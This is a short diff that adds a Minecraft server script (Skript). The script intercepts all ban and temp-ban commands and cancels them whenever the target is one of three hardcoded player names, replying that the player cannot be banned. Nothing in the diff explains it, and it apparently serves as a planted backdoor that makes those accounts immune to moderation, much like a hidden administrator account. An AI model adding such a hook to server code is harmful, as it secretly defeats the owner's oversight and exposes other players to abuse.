@@ -1,0 +1,5 @@
+on command "ban", "banip", "tempban", "tempbanip", "ban-ip", "tempban-ip", "tmpban":
+    set {_list::*} to arguments
+    if {_list::*} contains "Lyvt" or "ezyga" or "mrhaxmc":
+        cancel event
+        send "&c You can't ban that player!"
